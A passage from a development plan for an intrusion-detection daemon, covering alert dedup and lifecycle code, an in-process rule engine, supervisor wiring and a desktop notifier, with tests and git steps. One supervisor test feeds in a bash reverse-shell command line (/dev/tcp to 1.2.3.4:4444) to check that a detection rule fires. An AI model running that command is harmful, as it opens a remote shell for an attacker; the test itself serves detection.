    assert a.rule.severity.value == "critical"
    assert a.severity.value == "critical"
    assert a.category == "intrusion_detection"
    assert a.dedup_key == "lolbin.bash_dev_tcp:pid:1234"
    assert a.dedup_count == 1
    assert a.entities[0].kind == "process"
    assert a.entities[0].key == "pid:1234"
    assert a.rendered.short == "short"
    assert a.rendered.detail == "detail"
    assert a.event_ids == [ev.event_id]
    assert a.status.value == "new"
```

Write `tests/alerts/test_dedup.py`:

```python
"""Tests for the dedup engine."""

from __future__ import annotations

import time
from datetime import UTC, datetime
from pathlib import Path

from inspectord.alerts.builder import build_alert
from inspectord.alerts.dedup import DedupEngine
from inspectord.parsers.base import build_event
from inspectord.rules.base import Match
from inspectord.storage.db import Database
from inspectord.storage.migrations import run_migrations


def _ev() -> object:
    return build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={"pid": 1234, "name": "bash"},
    )


def _match() -> Match:
    return Match(
        rule_id="lolbin.bash_dev_tcp",
        severity="critical",
        category="intrusion_detection",
        dedup_key="lolbin.bash_dev_tcp:pid:1234",
        primary_entity_kind="process",
        primary_entity_key="pid:1234",
        short="short",
        detail="detail",
    )


def test_first_alert_inserts_new_row(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    with Database(db_path) as db:
        run_migrations(db)
    engine = DedupEngine(db_path=db_path, window_s=60.0)
    a = build_alert(match=_match(), event=_ev())
    written, was_new = engine.persist(a)
    assert was_new is True
    assert written.dedup_count == 1
    with Database(db_path) as db:
        rows = db.query("SELECT alert_id, dedup_count FROM alerts").fetchall()
    assert len(rows) == 1
    assert rows[0][1] == 1


def test_second_same_key_updates_existing(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    with Database(db_path) as db:
        run_migrations(db)
    engine = DedupEngine(db_path=db_path, window_s=60.0)
    a1 = build_alert(match=_match(), event=_ev())
    engine.persist(a1)
    a2 = build_alert(match=_match(), event=_ev())
    a2_out, was_new = engine.persist(a2)
    assert was_new is False
    assert a2_out.dedup_count == 2
    with Database(db_path) as db:
        rows = db.query("SELECT alert_id, dedup_count FROM alerts").fetchall()
    assert len(rows) == 1
    assert rows[0][1] == 2


def test_old_window_creates_new_alert(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    with Database(db_path) as db:
        run_migrations(db)
    engine = DedupEngine(db_path=db_path, window_s=0.05)
    a1 = build_alert(match=_match(), event=_ev())
    engine.persist(a1)
    time.sleep(0.1)
    a2 = build_alert(match=_match(), event=_ev())
    _, was_new = engine.persist(a2)
    assert was_new is True
    with Database(db_path) as db:
        n = db.query("SELECT COUNT(*) FROM alerts").fetchall()[0][0]
    assert n == 2
```

Write `tests/alerts/test_lifecycle.py`:

```python
"""Tests for alert lifecycle transitions."""

from __future__ import annotations

import pytest

from inspectord.alerts.lifecycle import InvalidTransitionError, validate_transition
from inspectord.schemas.alert import AlertStatus


def test_new_to_acknowledged() -> None:
    validate_transition(AlertStatus.new, AlertStatus.acknowledged)


def test_new_to_resolved() -> None:
    validate_transition(AlertStatus.new, AlertStatus.resolved)


def test_new_to_suppressed() -> None:
    validate_transition(AlertStatus.new, AlertStatus.suppressed)


def test_acknowledged_to_resolved() -> None:
    validate_transition(AlertStatus.acknowledged, AlertStatus.resolved)


def test_resolved_is_terminal() -> None:
    with pytest.raises(InvalidTransitionError):
        validate_transition(AlertStatus.resolved, AlertStatus.acknowledged)


def test_suppressed_is_terminal() -> None:
    with pytest.raises(InvalidTransitionError):
        validate_transition(AlertStatus.suppressed, AlertStatus.resolved)


def test_acknowledged_cannot_go_back_to_new() -> None:
    with pytest.raises(InvalidTransitionError):
        validate_transition(AlertStatus.acknowledged, AlertStatus.new)
```

- [ ] **Step 2: Confirm failures**

```bash
pytest tests/alerts/ -v
```

Expected: ImportErrors.

- [ ] **Step 3: Implement**

Write `inspectord/alerts/__init__.py`:

```python
"""Alert build + dedup + lifecycle (spec §7.2, §9.1, §9.2)."""
```

Write `inspectord/alerts/builder.py`:

```python
"""Convert a rule Match + triggering Event into a full Alert."""

from __future__ import annotations

from datetime import UTC, datetime

from inspectord.ids import uuid7
from inspectord.rules.base import Match
from inspectord.schemas.alert import (
    Alert,
    AlertStatus,
    EntityRef,
    RenderedAlert,
    RuleRef,
)
from inspectord.schemas.event import Event, Severity


def build_alert(*, match: Match, event: Event) -> Alert:
    now = event.ts if event.ts is not None else datetime.now(UTC)
    rule_ref = RuleRef(
        id=match.rule_id,
        name=match.rule_name or match.rule_id,
        ruleset="starter-pack",
        version="1.0.0",
        severity=Severity(match.severity),
        why=match.why or "",
        false_positives=list(match.false_positives),
    )
    return Alert(
        alert_id=str(uuid7()),
        rule=rule_ref,
        ts=now,
        severity=Severity(match.severity),
        status=AlertStatus.new,
        category=match.category,
        event_ids=list(match.triggering_event_ids) or [event.event_id],
        entities=[EntityRef(kind=match.primary_entity_kind, key=match.primary_entity_key)],
        dedup_key=match.dedup_key,
        dedup_count=1,
        first_seen_at=now,
        last_seen_at=now,
        rendered=RenderedAlert(short=match.short, detail=match.detail),
        labels=list(match.labels),
    )
```

Write `inspectord/alerts/dedup.py`:

```python
"""Dedup engine: persists Alerts; same dedup_key within window bumps counter."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

from inspectord.schemas.alert import Alert
from inspectord.storage.db import Database


class DedupEngine:
    def __init__(self, *, db_path: Path, window_s: float = 600.0) -> None:
        self._db_path = Path(db_path)
        self._window = timedelta(seconds=window_s)

    def persist(self, alert: Alert) -> tuple[Alert, bool]:
        """Persist or update. Returns (final_alert, was_new)."""
        cutoff = alert.ts - self._window
        with Database(self._db_path) as db:
            rows = db.query(
                "SELECT alert_id, dedup_count, first_seen_at FROM alerts "
                "WHERE dedup_key = ? AND last_seen_at >= ? "
                "ORDER BY last_seen_at DESC LIMIT 1",
                [alert.dedup_key, cutoff],
            ).fetchall()
            if rows:
                existing_id = rows[0][0]
                new_count = int(rows[0][1]) + 1
                first_seen = rows[0][2] if rows[0][2] is not None else alert.ts
                if isinstance(first_seen, str):
                    first_seen = datetime.fromisoformat(first_seen)
                if first_seen.tzinfo is None:
                    first_seen = first_seen.replace(tzinfo=UTC)
                db.execute(
                    "UPDATE alerts SET dedup_count = ?, last_seen_at = ?, "
                    "rendered_short = ?, rendered_detail = ?, payload_json = ? "
                    "WHERE alert_id = ?",
                    [
                        new_count,
                        alert.last_seen_at,
                        alert.rendered.short,
                        alert.rendered.detail,
                        alert.model_dump_json(),
                        existing_id,
                    ],
                )
                updated = alert.model_copy(update={
                    "alert_id": existing_id,
                    "dedup_count": new_count,
                    "first_seen_at": first_seen,
                })
                return updated, False
            db.execute(
                "INSERT INTO alerts ("
                "alert_id, rule_id, ts, severity, status, category, dedup_key, "
                "dedup_count, first_seen_at, last_seen_at, rendered_short, "
                "rendered_detail, payload_json) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                [
                    alert.alert_id,
                    alert.rule.id,
                    alert.ts,
                    alert.severity.value,
                    alert.status.value,
                    alert.category,
                    alert.dedup_key,
                    alert.dedup_count,
                    alert.first_seen_at,
                    alert.last_seen_at,
                    alert.rendered.short,
                    alert.rendered.detail,
                    alert.model_dump_json(),
                ],
            )
            return alert, True
```

Write `inspectord/alerts/lifecycle.py`:

```python
"""Alert status state machine (spec §9.1)."""

from __future__ import annotations

from inspectord.schemas.alert import AlertStatus


class InvalidTransitionError(RuntimeError):
    pass


_ALLOWED: dict[AlertStatus, set[AlertStatus]] = {
    AlertStatus.new: {AlertStatus.acknowledged, AlertStatus.resolved, AlertStatus.suppressed},
    AlertStatus.acknowledged: {AlertStatus.resolved, AlertStatus.suppressed},
    AlertStatus.resolved: set(),
    AlertStatus.suppressed: set(),
}


def validate_transition(current: AlertStatus, target: AlertStatus) -> None:
    if target not in _ALLOWED.get(current, set()):
        raise InvalidTransitionError(
            f"cannot transition {current.value!r} → {target.value!r}"
        )
```

- [ ] **Step 4: Confirm pass + lint**

```bash
pytest tests/alerts/ -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 11 new tests pass; total 235.

- [ ] **Step 5: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-07-alerts
git add inspectord/alerts/ tests/alerts/
git commit -m "feat(alerts): alert builder + dedup engine + lifecycle"
git push -u origin task-rules-07-alerts
gh pr create --base main --head task-rules-07-alerts \
  --title "feat(alerts): builder + dedup + lifecycle" \
  --body "Three pure-function modules: builder (Match + Event → Alert), dedup (window-based dedup_count update vs. new row in alerts table), lifecycle (status-transition graph: new→ack|resolved|suppressed; ack→resolved; resolved/suppressed terminal)."
```

Wait for CI green; do NOT merge.

---

## Task 8: rule_engine worker + supervisor router subscription

**Files:**
- Create: `inspectord/workers/rule_engine/__init__.py`
- Create: `inspectord/workers/rule_engine/__main__.py`
- Create: `tests/test_rule_engine_worker.py`

**Branch:** `task-rules-08-rule-engine-worker`

**Architectural note:** The rule_engine worker doesn't read from worker stdout — it needs the **enriched** events that come out of the supervisor's router. There are two ways to wire this:

1. The rule_engine is a worker subprocess that subscribes to the router via IPC. Heavy.
2. The rule_engine runs **in-process** in the supervisor. Simple.

For v1 we go with **option 2** — the rule_engine is a library invoked by the supervisor after enrichment, before journal/DB persistence. We keep the file structure under `inspectord/workers/rule_engine/` because future-us may want to split it into a real worker process; the code is still organised the same way.

Actually re-reading this more carefully — for Phase 1 simplicity, the rule_engine is **not** a separate worker process. It's a library that runs inside the supervisor's `_read_stdout` after enrichment. The `notifier` similarly subscribes to alert events emitted by the supervisor.

Let me restructure: rather than creating a `workers/rule_engine/`, we add `inspectord/rule_engine.py` and integrate it into the supervisor. Drop the `__main__.py` for now; future-us can split.

**Revised files:**
- Create: `inspectord/rule_engine.py` — the engine library (loads registry, runs evaluate per event, persists matches via dedup)
- Create: `tests/test_rule_engine.py`
- Modify: `inspectord/supervisor.py` — call `rule_engine.process(ev)` after enrichment

We also need to give the rule_engine a **sliding history** for time-window correlation rules (e.g. ssh_brute_force needs the recent ssh_login_failed events). A simple in-memory ring buffer keyed by `(action, severity)` is enough.

- [ ] **Step 1: Failing tests**

Write `tests/test_rule_engine.py`:

```python
"""Tests for the rule_engine library."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

from inspectord.parsers.base import build_event
from inspectord.rule_engine import RuleEngine
from inspectord.rules.base import EvalContext, Match
from inspectord.rules.registry import Registry
from inspectord.storage.db import Database
from inspectord.storage.migrations import run_migrations


class _AlwaysFireOnce:
    rule_id = "test.always"
    severity = "info"
    category = "test"

    def evaluate(self, ctx: EvalContext) -> list[Match]:
        return [
            Match(
                rule_id=self.rule_id,
                severity=self.severity,
                category=self.category,
                dedup_key=f"{self.rule_id}:event:{ctx.event.event_id}",
                primary_entity_kind="event",
                primary_entity_key=ctx.event.event_id,
                short=f"fire {ctx.event.event_id}",
                detail="d",
            )
        ]


def test_rule_engine_persists_alert(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    with Database(db_path) as db:
        run_migrations(db)
    reg = Registry(yaml_rules=[], python_rules=[_AlwaysFireOnce()])
    engine = RuleEngine(registry=reg, db_path=db_path, allowlist_entries=[])
    ev = build_event(
        module="m", action="a", category=["c"], type_=["t"], severity="info"
    )
    out = engine.process(ev)
    assert len(out) == 1
    with Database(db_path) as db:
        n = db.query("SELECT COUNT(*) FROM alerts").fetchall()[0][0]
    assert n == 1


def test_rule_engine_respects_allowlist(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    with Database(db_path) as db:
        run_migrations(db)
    reg = Registry(yaml_rules=[], python_rules=[_AlwaysFireOnce()])
    from datetime import datetime, UTC
    from inspectord.schemas.allowlist import AllowlistEntry, AllowlistScope, AllowlistStats

    entries = [
        AllowlistEntry(
            id="x",
            scope=AllowlistScope(rule_id="test.always"),
            reason="muted",
            created_by="eli@local",
            created_at=datetime.now(UTC),
            auto_origin=False,
            stats=AllowlistStats(),
        )
    ]
    engine = RuleEngine(registry=reg, db_path=db_path, allowlist_entries=entries)
    ev = build_event(module="m", action="a", category=["c"], type_=["t"], severity="info")
    out = engine.process(ev)
    assert out == []
    with Database(db_path) as db:
        n = db.query("SELECT COUNT(*) FROM alerts").fetchall()[0][0]
    assert n == 0


def test_rule_engine_passes_history_to_correlation_rules(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    with Database(db_path) as db:
        run_migrations(db)
    from inspectord.rules.starter_pack.ssh_brute_force import RULE

    reg = Registry(yaml_rules=[], python_rules=[RULE])
    engine = RuleEngine(registry=reg, db_path=db_path, allowlist_entries=[])
    now = datetime.now(UTC)
    ip = "1.2.3.5"
    # Push 4 failed logins from the same IP; none should fire.
    for i in range(4):
        ev = build_event(
            module="log_tailer",
            action="ssh_login_failed",
            category=["authentication"],
            type_=["end"],
            severity="medium",
            outcome="failure",
            source={"ip": ip, "port": 51234},
        ).model_copy(update={"ts": now - timedelta(seconds=10 - i)})
        assert engine.process(ev) == []
    # 5th fires.
    fifth = build_event(
        module="log_tailer",
        action="ssh_login_failed",
        category=["authentication"],
        type_=["end"],
        severity="medium",
        outcome="failure",
        source={"ip": ip, "port": 51234},
    )
    out = engine.process(fifth)
    assert len(out) == 1
    assert out[0].rule.id == "auth.ssh_brute_force"
```

- [ ] **Step 2: Confirm failure**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pytest tests/test_rule_engine.py -v
```

Expected: ImportError on `inspectord.rule_engine`.

- [ ] **Step 3: Implement**

Write `inspectord/rule_engine.py`:

```python
"""Rule engine library — runs in-process inside the supervisor.

Wires the rule Registry, the allowlist, and the dedup engine together. Keeps a
small sliding history so time-window correlation rules (e.g. ssh brute force)
work without each rule re-querying the journal.
"""

from __future__ import annotations

from collections import deque
from datetime import datetime, timedelta
from pathlib import Path

from inspectord.alerts.builder import build_alert
from inspectord.alerts.dedup import DedupEngine
from inspectord.allowlist.evaluator import is_suppressed
from inspectord.rules.base import EvalContext
from inspectord.rules.registry import Registry
from inspectord.schemas.alert import Alert
from inspectord.schemas.allowlist import AllowlistEntry
from inspectord.schemas.event import Event


_HISTORY_WINDOW = timedelta(seconds=300)
_HISTORY_MAX = 5000


class RuleEngine:
    def __init__(
        self,
        *,
        registry: Registry,
        db_path: Path,
        allowlist_entries: list[AllowlistEntry],
        dedup_window_s: float = 600.0,
    ) -> None:
        self._registry = registry
        self._allowlist = list(allowlist_entries)
        self._dedup = DedupEngine(db_path=db_path, window_s=dedup_window_s)
        self._history: deque[Event] = deque(maxlen=_HISTORY_MAX)

    def process(self, event: Event) -> list[Alert]:
        self._history.append(event)
        self._trim_history(event.ts)
        ctx = EvalContext(event=event, history=list(self._history))
        matches = self._registry.evaluate(ctx)
        out: list[Alert] = []
        for match in matches:
            if is_suppressed(match, self._allowlist):
                continue
            candidate = build_alert(match=match, event=event)
            persisted, _was_new = self._dedup.persist(candidate)
            out.append(persisted)
        return out

    def _trim_history(self, now: datetime) -> None:
        cutoff = now - _HISTORY_WINDOW
        while self._history and self._history[0].ts < cutoff:
            self._history.popleft()
```

- [ ] **Step 4: Confirm pass + lint**

```bash
pytest tests/test_rule_engine.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 3 new tests pass; total 238.

- [ ] **Step 5: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-08-rule-engine
git add inspectord/rule_engine.py tests/test_rule_engine.py
git commit -m "feat(rule_engine): in-process rule engine library"
git push -u origin task-rules-08-rule-engine
gh pr create --base main --head task-rules-08-rule-engine \
  --title "feat(rule_engine): in-process engine" \
  --body "RuleEngine.process(event) → list[Alert]. Wires Registry + Allowlist evaluator + DedupEngine. Keeps a sliding 5-minute / 5000-event history so time-window correlation rules don't have to re-query the journal."
```

Wait for CI green; do NOT merge.

---

## Task 9: Wire rule_engine into supervisor + notifier-channel queue

**Files:**
- Modify: `inspectord/supervisor.py`
- Modify: `tests/test_supervisor.py` (extend with a rule-firing test using a stub rule)

**Branch:** `task-rules-09-supervisor-wiring`

After this task, every event flowing through the supervisor's `_read_stdout` runs through `RuleEngine.process()` after enrichment. The engine fires any alerts and the supervisor exposes them via a small `attach_alert_listener(fn)` API that the notifier (next task) will subscribe to.

- [ ] **Step 1: Tests first**

In `tests/test_supervisor.py`, append:

```python
def test_supervisor_fires_rule_and_notifies_listener(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        from inspectord.parsers.base import build_event
        from inspectord.schemas.event import Event

        alerts_seen: list[object] = []

        def on_alert(a: object) -> None:
            alerts_seen.append(a)

        sup.attach_alert_listener(on_alert)

        # Wait for setup, then inject a synthetic event through the router.
        time.sleep(0.5)
        ev = build_event(
            module="process_collector",
            action="process_start",
            category=["process"],
            type_=["start"],
            severity="info",
            process={
                "pid": 9999,
                "name": "bash",
                "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            },
        )
        sup._inject_for_test(ev)  # type: ignore[attr-defined]
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not alerts_seen:
            time.sleep(0.05)
        assert alerts_seen, "rule did not fire after synthetic event"
    finally:
        sup.stop(timeout=5.0)
```

- [ ] **Step 2: Modify supervisor**

In `inspectord/supervisor.py`:

1. Add imports at the top:

```python
from inspectord.allowlist.file_loader import load_allowlist_file
from inspectord.rule_engine import RuleEngine
from inspectord.rules.python_loader import load_python_rules
from inspectord.rules.registry import Registry
```

2. In `Supervisor.__init__`, add:

```python
        # Rule engine: load Python rules from the starter pack + allowlist.
        python_rules = load_python_rules("inspectord.rules.starter_pack")
        self._rule_engine = RuleEngine(
            registry=Registry(yaml_rules=[], python_rules=python_rules),
            db_path=config.storage.db_path,
            allowlist_entries=load_allowlist_file(),
        )
        self._alert_listeners: list[Callable[[Alert], None]] = []
```

(YAML rules from the starter pack will be auto-loaded in a later task that adds a YAML directory loader. For Phase 1, the file-based YAML rules are loaded lazily when needed; the supervisor passes through.)

Actually for Phase 1, let's load the YAML rules now too. Append after the Python-loader line in `__init__`:

```python
        from importlib.resources import files
        from inspectord.rules.yaml_loader import load_yaml_rule_from_dict
        import yaml as _yaml

        yaml_rules = []
        pkg = files("inspectord.rules.starter_pack")
        for entry in pkg.iterdir():
            if entry.name.endswith(".yaml"):
                yaml_rules.append(
                    load_yaml_rule_from_dict(
                        _yaml.safe_load(entry.read_text(encoding="utf-8")),
                        source=entry.name,
                    )
                )
        self._rule_engine = RuleEngine(
            registry=Registry(yaml_rules=yaml_rules, python_rules=python_rules),
            db_path=config.storage.db_path,
            allowlist_entries=load_allowlist_file(),
        )
        self._alert_listeners = []
```

(Replace the earlier `self._rule_engine = ...` line; this version handles both YAML and Python rules.)

3. Add the `Alert` import:

```python
from inspectord.schemas.alert import Alert
```

4. Add public methods after `attach_listener`:

```python
    def attach_alert_listener(self, fn: Callable[[Alert], None]) -> None:
        self._alert_listeners.append(fn)

    def _inject_for_test(self, ev: Event) -> None:
        """Test hook: push an event directly to the router as if a worker emitted it."""
        ev = enrich(ev)
        alerts = self._rule_engine.process(ev)
        for a in alerts:
            for fn in list(self._alert_listeners):
                try:
                    fn(a)
                except Exception as exc:  # noqa: BLE001
                    log.warning("alert listener raised: %r", exc)
        self._router.publish(ev)
```

5. In `_read_stdout`, after `ev = enrich(ev)` but before `self._router.publish(ev)`, insert:

```python
                alerts = self._rule_engine.process(ev)
                for a in alerts:
                    for fn in list(self._alert_listeners):
                        try:
                            fn(a)
                        except Exception as exc:  # noqa: BLE001
                            log.warning("alert listener raised: %r", exc)
```

So the full block becomes:

```python
            try:
                payload = json.loads(raw.decode("utf-8"))
                ev = Event.model_validate(payload)
                ev = enrich(ev)
                alerts = self._rule_engine.process(ev)
                for a in alerts:
                    for fn in list(self._alert_listeners):
                        try:
                            fn(a)
                        except Exception as exc:  # noqa: BLE001
                            log.warning("alert listener raised: %r", exc)
                self._router.publish(ev)
            except Exception as exc:  # noqa: BLE001
                log.error("worker %s emitted invalid event: %r", wp.spec.name, exc)
```

- [ ] **Step 3: Confirm pass + lint**

```bash
pytest tests/test_supervisor.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 1 new supervisor test passes; total 239.

- [ ] **Step 4: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-09-supervisor-wiring
git add inspectord/supervisor.py tests/test_supervisor.py
git commit -m "feat(supervisor): wire rule engine + alert listener API"
git push -u origin task-rules-09-supervisor-wiring
gh pr create --base main --head task-rules-09-supervisor-wiring \
  --title "feat(supervisor): wire rule_engine" \
  --body "After enrichment, each event runs through RuleEngine.process(). Resulting Alerts fan out to attach_alert_listener(fn) subscribers. _inject_for_test() exposed for synthetic-event tests. The starter pack (Python plugins + YAML rules) is loaded at supervisor startup; allowlist is loaded from /etc/inspectord/allowlist.yaml (missing file → empty list)."
```

Wait for CI green; do NOT merge.

---

## Task 10: Desktop notifier sink + notifier worker

**Files:**
- Create: `inspectord/workers/notifier/__init__.py`
- Create: `inspectord/workers/notifier/__main__.py`
- Create: `inspectord/workers/notifier/sinks/__init__.py`
- Create: `inspectord/workers/notifier/sinks/desktop.py`
- Create: `tests/test_notifier_desktop_sink.py`
- Create: `tests/test_notifier_worker.py`

**Branch:** `task-rules-10-notifier`

The notifier doesn't run as a subprocess in v1 (it'd need IPC to subscribe to alerts). Instead, the supervisor invokes the notifier directly via `attach_alert_listener`. The desktop sink shells out to `notify-send`.

We still keep the `workers/notifier/` directory so a future split into a subprocess is clean. For now `__main__.py` just contains the in-process `NotifierWorker` class that the supervisor attaches.

- [ ] **Step 1: Failing tests**

Write `tests/test_notifier_desktop_sink.py`:

```python
"""Tests for the desktop notify-send sink."""

from __future__ import annotations

import subprocess

from inspectord.workers.notifier.sinks.desktop import DesktopSink


class _FakeRunner:
    def __init__(self) -> None:
        self.calls: list[tuple[str, ...]] = []

    def run(
        self,
        argv: list[str],
        *,
        timeout: float | None = None,
        check: bool = False,
    ) -> subprocess.CompletedProcess[bytes]:
        self.calls.append(tuple(argv))
        return subprocess.CompletedProcess(args=argv, returncode=0, stdout=b"", stderr=b"")


def test_desktop_sink_invokes_notify_send() -> None:
    runner = _FakeRunner()
    sink = DesktopSink(runner=runner)
    sink.send(
        severity="critical",
        title="Reverse shell detected",
        body="bash → 1.2.3.4:4444",
    )
    assert runner.calls
    argv = runner.calls[0]
    assert argv[0] == "notify-send"
    assert "Reverse shell detected" in argv
    assert "bash → 1.2.3.4:4444" in argv


def test_desktop_sink_uses_urgency_for_severity() -> None:
    runner = _FakeRunner()
    sink = DesktopSink(runner=runner)
    sink.send(severity="critical", title="t", body="b")
    sink.send(severity="info", title="t2", body="b2")
    assert "--urgency=critical" in runner.calls[0]
    assert "--urgency=low" in runner.calls[1]
```

Write `tests/test_notifier_worker.py`:

```python
"""Tests for the in-process NotifierWorker."""

from __future__ import annotations

import subprocess
from datetime import UTC, datetime

from inspectord.schemas.alert import (
    Alert,
    AlertStatus,
    EntityRef,
    RenderedAlert,
    RuleRef,
)
from inspectord.schemas.event import Severity
from inspectord.workers.notifier.__main__ import NotifierWorker


class _FakeRunner:
    def __init__(self) -> None:
        self.calls: list[tuple[str, ...]] = []

    def run(self, argv: list[str], *, timeout: float | None = None, check: bool = False):
        self.calls.append(tuple(argv))
        return subprocess.CompletedProcess(args=argv, returncode=0, stdout=b"", stderr=b"")


def _alert(severity: str = "critical") -> Alert:
    now = datetime.now(UTC)
    return Alert(
        alert_id="01900000-0000-7000-8000-000000000000",
        rule=RuleRef(
            id="lolbin.bash_dev_tcp",
            name="Reverse-shell pattern",
            ruleset="starter-pack",
            version="1.0.0",
            severity=Severity(severity),
            why="",
        ),
        ts=now,
        severity=Severity(severity),
        status=AlertStatus.new,
        category="intrusion_detection",
        event_ids=["e1"],
        entities=[EntityRef(kind="process", key="pid:1234")],
        dedup_key="lolbin.bash_dev_tcp:pid:1234",
        dedup_count=1,
        first_seen_at=now,
        last_seen_at=now,
        rendered=RenderedAlert(short="rs short", detail="rs detail"),
    )


def test_critical_alert_dispatches() -> None:
    runner = _FakeRunner()
    w = NotifierWorker(runner=runner)
    w.on_alert(_alert("critical"))
    assert runner.calls
    assert "rs short" in runner.calls[0]


def test_low_severity_skipped_by_default_routing() -> None:
    runner = _FakeRunner()
    w = NotifierWorker(runner=runner)
    w.on_alert(_alert("low"))
    assert runner.calls == []


def test_info_severity_skipped() -> None:
    runner = _FakeRunner()
    w = NotifierWorker(runner=runner)
    w.on_alert(_alert("info"))
    assert runner.calls == []


def test_high_severity_dispatches() -> None:
    runner = _FakeRunner()
    w = NotifierWorker(runner=runner)
    w.on_alert(_alert("high"))
    assert runner.calls


def test_medium_severity_dispatches() -> None:
    runner = _FakeRunner()
    w = NotifierWorker(runner=runner)
    w.on_alert(_alert("medium"))
    assert runner.calls
```

- [ ] **Step 2: Confirm failures**

```bash
pytest tests/test_notifier_desktop_sink.py tests/test_notifier_worker.py -v
```

Expected: ImportErrors.

- [ ] **Step 3: Implement**

Write `inspectord/workers/notifier/__init__.py`:

```python
"""Notifier worker package — in-process for v1."""
```

Write `inspectord/workers/notifier/sinks/__init__.py`:

```python
"""Notifier sinks (Desktop, Telegram-later, Signal-later)."""
```

Write `inspectord/workers/notifier/sinks/desktop.py`:

```python
"""Desktop popup sink — shells out to notify-send (libnotify)."""

from __future__ import annotations

import subprocess
from typing import Protocol


class _Runner(Protocol):
    def run(
        self, argv: list[str], *, timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[bytes]: ...


class _DefaultRunner:
    def run(
        self, argv: list[str], *, timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[bytes]:
        return subprocess.run(
            argv,
            timeout=timeout,
            check=check,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )


_URGENCY: dict[str, str] = {
    "info": "low",
    "low": "low",
    "medium": "normal",
    "high": "critical",
    "critical": "critical",
}


class DesktopSink:
    def __init__(self, *, runner: _Runner | None = None) -> None:
        self._runner: _Runner = runner if runner is not None else _DefaultRunner()

    def send(self, *, severity: str, title: str, body: str) -> None:
        urgency = _URGENCY.get(severity, "normal")
        argv = [
            "notify-send",
            f"--urgency={urgency}",
            "--app-name=inspectord",
            title,
            body,
        ]
        try:
            self._runner.run(argv, timeout=5.0)
        except Exception:  # noqa: BLE001 — notify-send may be absent on headless boxes
            pass
```

Write `inspectord/workers/notifier/__main__.py`:

```python
"""NotifierWorker — routes alerts to enabled sinks based on severity (spec §9.4)."""

from __future__ import annotations

import subprocess
from typing import Protocol

from inspectord.schemas.alert import Alert
from inspectord.workers.notifier.sinks.desktop import DesktopSink


class _Runner(Protocol):
    def run(
        self, argv: list[str], *, timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[bytes]: ...


# Default severity routing matrix (spec §9.4). Phase 1 only has Desktop;
# Telegram + Signal arrive with later plans and will land in this matrix.
_ROUTING: dict[str, set[str]] = {
    "critical": {"desktop"},
    "high": {"desktop"},
    "medium": {"desktop"},
    "low": set(),
    "info": set(),
}


class NotifierWorker:
    def __init__(self, *, runner: _Runner | None = None) -> None:
        self._desktop = DesktopSink(runner=runner)

    def on_alert(self, alert: Alert) -> None:
        sinks = _ROUTING.get(alert.severity.value, set())
        if not sinks:
            return
        title = f"[{alert.severity.value}] {alert.rule.name or alert.rule.id}"
        body = alert.rendered.short
        if "desktop" in sinks:
            self._desktop.send(severity=alert.severity.value, title=title, body=body)
```

- [ ] **Step 4: Wire NotifierWorker into supervisor**

In `inspectord/supervisor.py`, in `Supervisor.start()` after `self._db.connect()` and `run_migrations(self._db)` and `self._subscribe_storage()`, append:

```python
        # Default notifier: desktop sink only for v1.
        from inspectord.workers.notifier.__main__ import NotifierWorker
        self._notifier = NotifierWorker()
        self.attach_alert_listener(self._notifier.on_alert)
```

(The notifier is created at start() rather than __init__() because production users can swap the listener via attach_alert_listener — and tests construct Supervisor without immediately wanting a desktop popup. Wait — that's contradictory. Let me think.)

Actually attaching the notifier in start() means every test that calls `sup.start()` will get a desktop notifier wired in, which will try to invoke notify-send during tests. That's no good.

Better: gate the desktop notifier behind a config flag. In `inspectord/config.py`, the `DaemonConfig` already has fields. Add an optional notifier config:

In `inspectord/config.py`, find `class DaemonConfig` and add (after `workers`):

```python
    notifier_desktop_enabled: bool = True
```

Then in `dev_config(*, base)`, the returned dict already passes through extra fields via model_validate. Set `notifier_desktop_enabled=False` in dev_config so tests don't trigger notifications, and document that production configs default to True.

Actually the simplest path: have `dev_config()` return `notifier_desktop_enabled=False`, document that real production configs set `True`. Then in `Supervisor.start()`:

```python
        if self._cfg.notifier_desktop_enabled:
            from inspectord.workers.notifier.__main__ import NotifierWorker
            self._notifier = NotifierWorker()
            self.attach_alert_listener(self._notifier.on_alert)
```

In `inspectord/config.py`, update `DaemonConfig`:

```python
class DaemonConfig(BaseModel):
    model_config = ConfigDict(extra="forbid")
    version: str
    storage: StorageConfig
    ipc: IpcConfig
    workers: list[WorkerSpec] = Field(default_factory=list)
    notifier_desktop_enabled: bool = False
```

And `dev_config(*, base)` returns a dict that omits `notifier_desktop_enabled` (so it defaults to False). For production config files at `/etc/inspectord/config.toml`, the user can set:

```toml
notifier_desktop_enabled = true
```

- [ ] **Step 5: Confirm pass + lint**

```bash
pytest tests/test_notifier_desktop_sink.py tests/test_notifier_worker.py tests/test_supervisor.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
